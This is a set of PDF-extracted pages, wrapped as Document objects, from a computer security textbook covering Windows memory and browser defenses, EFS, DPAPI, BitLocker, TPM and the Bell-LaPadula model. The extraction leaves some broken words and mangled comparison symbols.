       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 848, 'page_label': '26-19'}, page_content='26.3 / WindoWS SEC u R i T y  d EFE n SES   26-19\\nobjects, and scalar values. The reason for this is to make it harder for some attacks \\nto succeed. Function pointers and C+ + objects with virtual destructors (which are \\nsimply function pointers) are also subject to attack because they determine execution \\nflow. If these constructs are placed in memory higher than buffers, then, for example, \\noverflowing a buffer could corrupt a function pointer. By switching the order around, \\nthe attacker must take advantage of a buffer underrun, which is rarer, to successfully \\ncorrupt the function pointer. There are variants of the buffer overrun that will still \\ncorrupt a function pointer, such as corrupting a stack frame in higher memory, but \\nthat’s beyond the scope of this chapter.\\n/GS does have one weakness—when the code is compiled, the compiler applies \\nheuristics to determine which functions to protect, hence /GS does not affect every \\nfunction, it affects only functions that have at least 4-bytes of contiguous stack \\nchar-data and only when the function takes a pointer or buffer as an argument. To \\naddress this potential issue, Microsoft added an option to relax the heuristics that \\nmore functions are protected. The option is named strict_gs_check; more infor-\\nmation can be found here (http://blogs.msdn.com/b/michael_howard/\\narchive/2007/04/03/hardening-stack-based-buffer-overrun-\\ndetection-in-vc-2005-sp1.aspx).\\nno eXecute Named NX by Advanced Micro Devices (AMD), Data Execution Pre-\\nvention (DEP) by Microsoft, and eXecution Disable (XD) by Intel, this technology \\nrequires CPU support that helps prevent code from executing in data segments. Most \\nmodern Intel CPUs support this capability today, and all current AMD CPUs sup-\\nport NX. ARM-based CPUs also support NX. DEP support was first introduced in \\nWindows XP SP2 and is a critically important defense in Windows, especially when \\nused with address space layout randomization (ASLR), which we will explain later.\\nThe goal of NX is to prevent data executing. Most buffer overrun exploits \\nenter a computer system as data, and then those data are executed. By default, most \\nsystem components in Windows and applications can use NX by linking with the  \\n/NXCOMPAT linker option.\\nWe will discuss NX and ASLR in the context of a browser defense shortly.\\nstack ranDomization This defense is available in Windows Vista and later. When a \\nthread starts in Windows, the operating system will randomize the stack base address \\nby 0–31 pages. Normally, a page is 4k bytes in size. Once the page is chosen, a random \\noffset is chosen within the page, and the stack starts from that spot. The purpose of \\nrandomization is to remove some of the predictability from the attacker. Attackers love \\npredictability because it makes it more likely that an attack will be successful.\\nThere is more to life than stack-based buffer overruns. Data can also reside in \\nanother kind of system memory, the heap.\\nheaD-baseD buffer overrun Detection The seminal buffer overrun paper is \\n“Smashing the Stack for Fun and Profit” by AlephOne [LEVY96]. It is a fantastic \\nread. For quite some time, “smashing the stack” was the attack dejour, and little atten-\\ntion was paid to heap-based buffer overruns. Eventually, people realized that even \\nthough the heap is laid out differently than the stack, heap-based buffer overruns are \\nexploitable, and can lead to code execution. The nature of such attacks is something \\nyou should research [LITC03].\\nM26_STAL0611_04_GE_C26.indd   19 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 849, 'page_label': '26-20'}, page_content='26-20  CHAPTER 26 / WindoWS  S EC u R i T y\\nThe first heap defense, added to Windows XP SP2, is to add a random value to \\neach heap block and detect that this cookie has not been tampered with. If the cookie \\nhas changed, then the heap has been corrupted and the application could be forced to \\ncrash. Note the application crash is not due to instability in the application caused by \\ndata corruption; rather the heap manager detects the corruption and fails the applica-\\ntion. The process of shutting down an application in this manner is often called “failstop.”\\nThe second defense is heap integrity checking; when heap blocks are freed, \\nmetadata in the heap data structures are checked for validity, and if the data are \\ncompromised, either the heap block is leaked or the application crashes.\\nOther important defenses have been added including removing heap-block \\nelements that were used by attackers.\\nheaP ranDomization Like stack randomization, heap randomization is designed \\nto take some of the predictability away from the attacker, but it applies to the heap. \\nWhen a heap is created, the start of the heap is offset by 0–4 MB. Again, this makes \\nthings a little harder for the attacker. This feature is new to Windows Vista.\\nimage ranDomization As far as making thinks a little less predictable for the \\nattacker, Windows Vista also adds image randomization. When the operating system \\nboots, it starts up in one of 256 configurations. In other words, the entire operating \\nsystem is shifted up or down in memory when it is booted. The best way to think \\nof this is to imagine that a random number is selected at boot, and every operating \\nsystem component is loaded as an offset from that location, but the offset between \\neach component is fixed. Again, this makes the operating system less predictable for \\nattackers and makes it less likely that an exploit will succeed.\\nservice restart PoLicy In Windows, a service can be configured to restart if the \\nservice fails. This is great for reliability but lousy for security, because if an attacker \\nattacks the service and the attack fails but the service crashes, the service might \\nrestart and the attacker will have another chance to attack the system. In Windows \\nVista, Microsoft set some of the critical services to restart only twice, after which the \\nservice will not restart unless the administrator manually restarts the service. This \\ngives the attacker only two attempts to get the attack to work, and in the face of stack, \\nheap, and image randomization, it is much more difficult.\\nNote that a full description of all the defenses described in this section, and how \\nto use them in your own code, can be found in [HOWA07].\\n 26. 4  BR OWSER DEFENSES\\nThere is no point of attack quite like a Web browser. A Web browser interprets a com-\\nplex language, HTML, and renders the results. But a webpage can also contain code  \\nin the form of scripting languages such as JavaScript, or richer, more capable code\\xa0such \\nas ActiveX controls, Flash, Java applets, or .NET applications; and mixing code and \\ndata is bad for security. All of this code and data makes for a rich and productive \\nend-user environment, but it is hard to secure. Web browsers can also render various \\nmultimedia objects such as sound, JPEG, BMP , GIF, animated GIFs, and PNG files. \\nMany file formats are rendered by helper objects, called MIME handlers. Examples \\ninclude video formats such as Quicktime, Windows Media Player, or Real Player.  \\nM26_STAL0611_04_GE_C26.indd   20 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 850, 'page_label': '26-21'}, page_content='26.5 / CRyPToGRAPHiC SER ViCES  26-21\\nA malicious webpage could take advantage of many possible attack vectors; some \\nvectors are under the direct control of the browser, and some are not.\\nWith this setting in mind, Microsoft decided to add many defenses to Inter -\\nnet Explorer, and each successive version adds more defenses. Substantially, these \\napproaches carry over to their replacement browser, Microsoft Edge. Perhaps the \\nmost important single defense is ActiveX opt-in. An ActiveX control is a binary \\nobject that can potentially be invoked by the Web browser using the <OBJECT> \\nHTML tag, or by calling the object directly from script. Many common Web browser \\nextensions are implemented as ActiveX controls; probably the most well known is \\nAdobe Flash. It is possible for ActiveX controls to be malicious, and chances are very \\ngood that a user already has one or more ActiveX controls installed on his or her \\ncomputer. But does the user know which controls are installed? We would wager that \\nfor most users, the answer is a resounding, “no!” Internet Explorer adds a new feature \\ncalled “ActiveX opt-in,” which essentially unloads ActiveX controls by default, and \\nwhen a control is used for the first time, the user is prompted to allow the control to \\nrun. At this point, the user knows that the control is on the computer. Microsoft Edge \\ndoes not support ActiveX but has similar protections.\\nAnother important defense in Internet Explorer is protected mode. When this \\ndefault configuration is used, Internet Explorer runs at low-integrity level, making it more \\ndifficult for malware to manipulate the operating system which operates at a medium- or \\nhigher-integrity level. See \\nSection 26.1 for a discussion of integrity levels in Windows.\\nCurrent versions of Internet Explorer also enable ASLR and DEP by default. \\nIn IE7 , the options were available, but not enabled by default because many common \\ncomponents, such as Flash, Acrobat Reader, QuickTime, the Java VM, and more, \\nbroke. Microsoft worked very closely with the component vendors to make them \\noperate correctly with ASLR and DEP .\\nIt is important to point out that Protected Mode, DEP and ASLR only help \\nmitigate against memory corruption vulnerabilities, they do not help protect against \\nPhishing attacks nor common Web-specific vulnerabilities such as cross-site scripting \\n(XSS.) Microsoft added defenses to Internet Explorer to help address these issues. \\nFirst, a cross-site scripting detection logic to help detect and prevent some classes of \\nXSS. Some would argue that adding this logic to a Web browser is a bad idea, because \\nXSS prevention should be the goal of a Web application. Personally, I think it is a \\ngreat idea, because we obviously cannot rely on Web site developers to write secure \\nand XSS-free Web-based applications. This IE defense is simply an extra defensive \\nlayer. The second defense is a phishing filter; simply put when a user visits a Website, \\nthe site’s URL is sent to a service that determines if the site is a known phishing or \\nmalware-distribution site. The user is warned if the site is suspicious.\\nA final defense to help prevent users being tracked is a privacy-enhancing mode \\nname InPrivate mode, which does not persist cookies or site history.\\n 26.5 CRYPTOGRAPHIC SERVICES\\nWindows includes a complete set of cryptographic functionality, from low-level \\ncryptographic primitives for encryption, hashing, and signing to full-fledged cryp-\\ntographic defenses, such as the Encrypting File System (EFS), Data Protection API, \\nand  BitLocker\\n. Let’s look at each of these features in more detail.\\nM26_STAL0611_04_GE_C26.indd   21 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 851, 'page_label': '26-22'}, page_content='26-22  CHAPTER 26 / WindoWS  S EC u R i T y\\nEncrypting File System\\nEFS allows files and directories to be encrypted and decrypted transparently for autho-\\nrized users. All versions of Windows since Windows 2000 support EFS. On the surface, \\nEFS is very simple; a user or administrator marks a directory to use EFS, and from that \\npoint on, any file created in that directory is encrypted. It is possible to encrypt single \\nfiles, but this is problematic because it is common for applications to create temporary \\nfiles while manipulating the file in question. But if the target file is marked for encryp-\\ntion, the temporary files are not encrypted, and if the temporary files contain sensitive \\ndata, the data are not protected. The way to fix this is to encrypt the entire directory.\\nAt a very high level, EFS works by generating a random file encryption key \\n(FEK) and storing that key, encrypted using the user’s encryption key. This key is \\nprotected using the Data Protection API (DPAPI) in Windows, and the key used by \\nDPAPI is derived from the user’s password. The process of allowing a new user to \\naccess an EFS-encrypted file is simple too. The FEK is encrypted with the user’s key, \\nand it is stored alongside the other user keys in the file metadata.\\nEFS also supports the concept of a file recovery agent, a special capability to \\ndecrypt files if for some reason the user’s lose their EFS keys.\\nThe cornerstone of EFS is DPAPI, which is the next topic.\\nData Protection API\\nThe data protection API (DPAPI) allows users to encrypt and decrypt data trans-\\nparently; in other words, the tasks of maintaining and protecting encryption keys are \\nremoved from the user and administered by the operating system. When DPAPI is \\nused to encrypt user data, the encryption keys are derived in part from the user’s \\npassword. A full explanation of how DPAPI works is available at [NAI01]. Again, \\nthe beauty of DPAPI lies in removing the key management problem from the user \\nand developers. Developers need only call one of two functions, CryptProtectData \\nto encrypt and CryptUnprotectData to decrypt. These functions also add a message \\nauthentication code to the encrypted data to help detect tampering.\\nBitLocker\\nWindows adds a much-needed defense to the operating system, BitLocker Drive Encryp-\\ntion. The core threat this technology helps to mitigate is data disclosure on stolen laptops. \\nBitLocker encrypts the entire volume using AES, and the encryption key is stored either \\non a USB drive or within a Trusted Platform Module (TPM) chip on the computer \\nmotherboard. When booting a system that requires the USB device, the device must be \\npresent so the keys can be read by the computer, after which \\n BitLock\\ner decrypts the \\nhard drive on the fly, with no perceptible performance degradation. The downside to \\nusing a USB device is that if the device is lost, the user loses the encryption keys and \\ncannot decrypt. Thankfully, BitLocker can integrate with Active Directory to store the \\nencryption keys, and BitLocker also supports key recovery.\\nPerhaps the most important aspect of BitLocker is that, like most security set-\\ntings in Windows, BitLocker policy can be set as a policy for a single computer and \\nthat policy “pushed” to computers that use Active Directory.\\nM26_STAL0611_04_GE_C26.indd   22 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 852, 'page_label': '26-23'}, page_content='26.7 / REFEREnCES  26-23\\nBitLocker is the first technology in Windows to use a TPM chip, and that’s the \\nnext topic.\\nTrusted Platform Module\\nThe Trusted Platform Module (TPM) is the product of a specification from the \\nTrusted Computing Group, designed to enhance system security by moving many \\nsensitive cryptographic operations into hardware. Many software-based attacks do \\nnot affect a hardware solution, such as TPM. TPMs are discussed in \\nChapter 27 .\\nWindows Vista supports TPM version 1.2.\\nThe best-known feature that uses the TPM, if one is available, is BitLocker \\nDrive Encryption. When a TPM is present and the system is configured appropri-\\nately, Windows will use the TPM to validate that the operating system has not been \\ntampered with. This is known as trusted boot, or secure startup, and as the OS boots, \\ncritical portions are hashed and the hashes verified.\\nMicrosoft expects more software vendors to make use of the TPM over time, \\nespecially as most laptops shipping today include a TPM on the motherboard, and \\nmore desktop and server computers ship with embedded TPMs.\\n 26.6 COMMON CRITERIA\\nVersions of Windows since Windows 2000 have earned Common Criteria \\nEAL4 + Flaw Remediation (ALC_FLR.3) or are in the process of being accredited. \\nWhat is critically important about the work Microsoft has undertaken in getting its \\noperating systems accredited is that the software stack (the security target) that is \\nevaluated is useable. It is not a whittled-down configuration that is just an FTP server, \\nfor example. You can look at the Windows Server 2003 and Windows XP product \\nvalidation reports at [NIAP07].\\nHOWA07 Howard,  M., and LeBlanc, D. Writing Secure Code for Windows Vista. Red -\\nmond, WA: Microsoft Press, 2006.\\nLEVY9 6\\nLevy, E., “Smashing the Stack for Fun and Profit.” Phrack Magazine, file 14, \\nIssue 49, November 1996.\\nLITC03 Litchfield, D\\n.“Defeating the Stack Based Buffer Overflow Prevention \\n Me\\nchanism of Microsoft Windows 2003 Server.” NGS Software White Paper, 8 September \\n2003. ngssoftware.com/papers/defeating-w2k3-stack-protection.pdf\\nNAI01 NAI L\\nabs. Windows Data Protection. Windows Developer Network, October \\n2001. https://msdn.microsoft.com/en-us/library/ms995355.aspx \\nNIAP07 Na\\ntional Information Assurance Partnership. Common Criteria Evaluation and \\nValidation Scheme Validation Report — Microsoft Windows 2003 Server and XP Worksta-\\ntion. April 2007 . https://msdn.microsoft.com/en-us/library/dd229319.aspx \\n 26.7 REFERENCES\\nM26_STAL0611_04_GE_C26.indd   23 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 853, 'page_label': '26-24'}, page_content='26-24  CHAPTER 26 / WindoWS  S EC u R i T y\\nProjects\\nA series of projects are contained in a document, filename WindowsProjects.pdf, \\navailable at this book’s website. These projects were developed by Ricky Magalhaes \\nof Fastennet Security. These are designed to help you learn about Windows security. \\nThese are not review questions but rather exercises that expose parts of Windows to \\nyou in security context, and will help you to learn parts of windows security.\\n 26. 8  KEY TERMS AND PR OJECTS\\nKey Terms\\nActive Directory\\nBitLocker Drive Encryption\\nTPM\\nAccess Control Lists\\nauthentication packages\\ndomain account\\nlocal account\\nLocal Security Authority\\nNetLogon\\nSecurity Account Manager\\nSecurity Reference Monitor\\nWinLogon\\nM26_STAL0611_04_GE_C26.indd   24 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 854, 'page_label': '27-1'}, page_content='27-1\\n27.1 The Bell-LaPadula Model for Computer Security\\nComputer Security Models\\nGener\\nal Description\\nFormal Description of Model\\nAbstract Operations\\nExample of BLP Use\\nImplementation Example—Multics\\nLimitations to the BLP model\\n27.2\\n Other Formal Models for Computer Security\\nBiba Integrity Model\\nClark–W\\nilson Integrity Model\\nChinese Wall Model\\n27.3\\n The Concept of Trusted Systems\\nR\\neference Monitors\\nTrojan Horse Defense\\n27.4\\n Application of Multilevel Security\\nMultilevel Security for R\\nole-Based Access Control\\nDatabase Security and Multilevel Security\\n27.5\\n Trusted Computing and the Trusted Platform Module\\nA\\nuthenticated Boot Service\\nCertification Service\\nEncryption Service\\nTPM Functions\\nProtected Storage\\n27.6\\n Common Criteria for Information Technology Security Evaluation\\nR\\nequirements\\nProfiles and Targets\\nExample of a Protection Profile\\nTrusted Computing and  \\nMultilevel Security\\nCHAPTER \\n \\nM27_STAL0611_04_GE_C27.indd   1 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 855, 'page_label': '27-2'}, page_content='27-2  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Explain the Bell-L\\naPadula model and its relevance to trusted computing.\\n ◆ Summarize other formal models for computer security\\n.\\n ◆ Understand the concept of trusted systems\\n.\\n ◆ List and explain the pr\\noperties of a reference monitor and explain the \\n r\\nelationship between a reference monitor and a security kernel database.\\n ◆ Pr\\nesent an overview of the application of multilevel security to role-based \\naccess control and to database security.\\n ◆ Discuss har\\ndware approaches to trusted computing.\\n ◆ Explain and summarize the common criteria for information technology \\nsecurity ev\\naluation.\\nThis chapter deals with a number of interrelated topics having to do with the degree \\nof confidence users and implementers can have in the following security functions \\nand services:\\n•\\n F\\normal models for computer security\\n•\\n Multilevel security\\n•\\n T\\nrusted systems\\n•\\n Mandatory access contr\\nol\\n•\\n Security ev\\naluation\\n 27. 1  THE BELL-LAP ADULA MODEL FOR COMPUTER SECURITY\\nComputer Security Models\\nTwo historical facts highlight a fundamental problem that needs to be addressed in \\nthe area of computer security. First, all complex software systems have eventually \\n27.7 Assurance and Evaluation\\nT\\narget Audience\\nScope of Assurance\\nCommon Criteria Evaluation Assurance Levels\\nEvaluation Process\\n27.8\\n References\\n27.\\n9\\n Key Terms, Review Questions, and Problems\\nM27_STAL0611_04_GE_C27.indd   2 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 856, 'page_label': '27-3'}, page_content='27.1 / THE BEll-lAPAdulA ModEl FoR CoMPuTER SECuRiTy  27-3\\nrevealed flaws or bugs that subsequently needed to be fixed. A good discussion of \\nthis can be found in the classic The Mythical Man-Month [BROO95]. Second, it is \\nextraordinarily difficult, if not impossible, to build a computer hardware/software \\nsystem that is not vulnerable to a variety of security attacks. An illustration of this \\ndifficulty is the Windows NT operating system, introduced by Microsoft in the early \\n1990s. Windows NT was promised to have a high degree of security and to be far \\nsuperior to previous OSs, including Microsoft’s Windows 3.0 and many other personal \\ncomputer, workstation, and server OSs. Sadly, Windows NT did not deliver on this \\npromise. This OS and its successor Windows versions have been chronically plagued \\nwith a wide range of security vulnerabilities.\\nProblems to do with providing strong computer security involved both design \\nand implementation. It is difficult, in designing any hardware or software  module, to \\nbe assured that the design does in fact provide the level of security that was intended. \\nThis difficulty results in many unanticipated security vulnerabilities. Even if the \\ndesign is in some sense correct, it is difficult, if not impossible, to implement the \\ndesign without errors or bugs, providing yet another host of vulnerabilities.\\nThese problems have led to a desire to develop a method to prove, logically \\nor mathematically, that a particular design does satisfy a stated set of security \\nrequirements and that the implementation of that design faithfully conforms to the \\ndesign specification. To this end, security researchers have attempted to develop for-\\nmal models of computer security that can be used to verify security designs and \\nimplementations.\\nInitially, research in this area was funded by the U.S. Department of Defense \\nand considerable progress was made in developing models and in applying them to \\nprototype systems. That funding has greatly diminished as have attempts to build \\nformal models of complex systems. Nevertheless, such models have value in providing \\na discipline and a uniformity in defining a design approach to security requirements \\n[BELL05]. In this section, we look at perhaps the most influential computer security \\nmodel, the Bell-LaPadula (BLP) model [BELL73, BELL75]. Several other models \\nwill be examined in Section 27.2.\\nGeneral Description\\nThe BLP model was developed in the 1970s as a formal model for access control. The \\nmodel relied on the access control concept described in Chapter 4 (e.g., Figure 4.4). \\nIn the model, each subject and each object is assigned a security class. In the simplest \\nformulation, security classes form a strict hierarchy and are referred to as security \\nlevels. One example is the U.S. military classification scheme:\\ntop secret 7 secret 7 confidential 7 restricted 7 unclassified\\nIt is possible to also add a set of compartments, or categories, to each security \\nlevel, so that a subject must be assigned both the appropriate level and compartment \\nto access an object. We will ignore this refinement in the following discussion.\\nThis concept is equally applicable in other areas, where information can be \\norganized into gross levels and compartments, and users can be granted clearances \\nto access certain compartments of data. For example, the highest level of security \\nmight be for strategic corporate planning documents and data, accessible by only \\ncorporate officers and their staff; next might come sensitive financial and personnel \\nM27_STAL0611_04_GE_C27.indd   3 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 857, 'page_label': '27-4'}, page_content='27-4  CHAPTER 27 / TRuSTEd CoMPuTing And MulTilEvEl SECuRiTy \\ndata, accessible only by administration personnel, corporate officers, and so on. This \\n suggests a classification scheme such as:\\nstrategic 7 sensitive 7 confidential 7 public\\nA subject is said to have a security clearance of a given level; an object is said to \\nhave a security classification of a given level. The security classes control the  manner \\nby which a subject may access an object.\\n The model defined four access modes, \\nalthough the authors pointed out that in specific implementation environments, a \\ndifferent set of modes might be used. The modes are as follows:\\n• read:\\n The subject is allowed only read access to the object.\\n• append:\\n The subject is allowed only write access to the object.\\n• write: \\nThe subject is allowed both read and write access to the object.\\n• ex\\necute: The subject is allowed neither read nor write access to the object but \\nmay invoke the object for execution.\\nWhen multiple categories or levels of data are defined, the requirement is \\nreferred to as multilevel security (MLS). The general statement of the requirement \\nfor confidentiality-centered multilevel security is that a subject at a high level may not \\nconvey information to a subject at a lower level unless that flow accurately reflects \\nthe will of an authorized user as revealed by an authorized declassification. For imple-\\nmentation purposes, this requirement is in two parts and is simply stated. A multilevel \\nsecure system for confidentiality must enforce the following:\\n• No read up:\\n A subject can only read an object of less or equal security level. \\nThis is referred to in the literature as the simple security property (ss-property).\\n• No write down: A subject can only write into an object of greater or equal \\nsecurity level. This is referred to in the literature as the *-property1 (pronounced \\nstar property).\\nF\\nigure 27.1 illustrates the need for the *-property. Here, a malicious subject \\npasses classified information along by placing it into an information container labeled \\nat a lower security classification than the information itself. This will allow a subse-\\nquent read access to this information by a subject at the lower clearance level.\\nThese two properties provide the confidentiality form of what is known as \\n mandatory access \\ncontrol (MAC). Under MAC, no access is allowed that does not \\nsatisfy these two properties. In addition, the BLP model makes a provision for dis-\\ncretionary access control (DAC).\\n• ds-property:\\n An individual (or role) may grant to another individual (or role) \\naccess to a document based on the owner’s discretion, constrained by the MAC \\nrules. Thus, a subject can exercise only accesses for which it has the necessary \\nauthorization, and which satisfy the MAC rules.\\n1The “*” does not stand for anything. No one could think of an appropriate name for the property during \\nthe writing of the first report on the model. The asterisk was a dummy character entered in the draft so a \\ntext editor could rapidly find and replace all instances of its use once the property was named. No name \\nwas ever devised, and so the report was published with the “*” intact.\\nM27_STAL0611_04_GE_C27.indd   4 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 858, 'page_label': '27-5'}, page_content='27.1 / THE BEll-lAPAdulA ModEl FoR CoMPuTER SECuRiTy  27-5\\nThe basic idea is that site policy overrides any discretionary access controls. \\nThat is, a user cannot give away data to unauthorized persons.\\nFormal Description of Model\\nWe use the notation presented in [BELL75]. The model is based on the concept of a \\ncurrent state of the system. The state is described by the 4-tuple (b, M, f, H), defined \\nas follows:\\n• Current access set \\nb: This is a set of triples of the form (subject, object, access-\\nmode). A triple (s, o, a) means that subject s has current access to o in access \\nmode a. Note that this does not simply mean s has the access right a to\\xa0o. The \\ntriple means that s is currently exercising that access right; that is, s is  currently \\naccessing \\no by mode a.\\n• Access matrix M: The access matrix has the structure indicated in \\nChapter 4. \\nThe matrix element Mij records the access modes in which subject Si is permit-\\nted to access object Oj.\\n• Level function f: This function assigns a security level to each subject and object. \\nIt consists of three mappings: fo(Oj) is the classification level of object Oj; fs(Si) \\nis the security clearance of subject Si; fc(Si) is the current security level of  \\nsubject Si. The security clearance of a subject is the maximum security level of \\nthe subject. The subject may operate at this level or at a lower level. Thus, a user \\nmay log onto the system at a level lower than the user’s security clearance. This \\nis particularly useful in a role-based access control system.\\n• Hierarchy H\\n: This is a directed rooted tree whose nodes correspond to objects \\nin the system. The model requires that the security level of an object must \\ndominate the security level of its parent. For our discussion, we may equate this \\nFigure 27.1 Information Flow Sho wing the Need for the *-Property\\nObserve\\nAlter\\nFlow of\\ninformation\\nMalicious subject\\nwith high-level\\nsecurity clearance\\nHigh-level object\\nLow-level object\\nM27_STAL0611_04_GE_C27.indd   5 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 859, 'page_label': '27-6'}, page_content='27-6  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nwith the condition that the security level of an object must be greater than or \\nequal to its parent.2\\nWe can now define the three BLP properties more formally. For every subject \\nSi and every object Oj, the requirements can be stated as follows:\\n•\\n ss-pr\\noperty: Every triple of the form ( Si, Oj, read) in the current access set b \\nhas the property fc(Si) Ú fo(Oj).\\n• *-pr operty: Every triple of the form ( Si, Oj, append) in the current access set b \\nhas the property fc(Si) … fo(Oj). Every triple of the form ( Si, Oj, write) in the \\ncurrent access set b has the property fc(Si) = fo(Oj).\\n• ds-pr operty: If (Si, Oj, Ax) is a current access (is in b ), then access mode \\nAx is recorded in the (Si, Oj) element of M . That is, (Si, Oj, Ax) implies that \\nAx /uni2208M[Si, Oj].\\nThese three properties can be used to define a confidentiality secure system.  \\nIn essence, a secure system is characterized by the following:\\n1.\\n T\\nhe current security state of the system (b, M, f, H) is secure if and only if every \\nelement of b satisfies the three properties.\\n2.\\n T\\nhe security state of the system is changed by any operation that causes a change \\nany of the four components of the system, (b, M, f, H).\\n3.\\n A secur\\ne system remains secure so long as any state change does not violate \\nthe three properties.\\n[BELL75] shows how these three points can be expressed as theorems using the \\nformal model. Further, given an actual design or implementation, it is theoretically \\npossible to prove the system secure by proving that any action that affects the state \\nof the system satisfies the three properties. In practice, for a complex system, such \\na proof has never been fully developed. However, as mentioned earlier, the formal \\nstatement of requirements can lead to a more secure design and implementation.\\nAbstract Operations\\nThe BLP model includes a set of rules based on abstract operations that change the \\nstate of the system. The rules are as follows:\\n1.\\n Get access:\\n Add a triple (subject, object, access-mode) to the current access set\\xa0b. \\nUsed by a subject to initiate access to an object in the requested mode.\\n2.\\n R\\nelease access: Remove a triple (subject, object, access-mode) from the current \\naccess set b. Used to release previously initiated access.\\n3.\\n Change \\nobject level: Change the value of fo(Oj) for some object Oj. Used by a \\nsubject to alter the security level of an object.\\n4.\\n Change curr\\nent level: Change the value of fc(Si) for some subject Si. Used by a 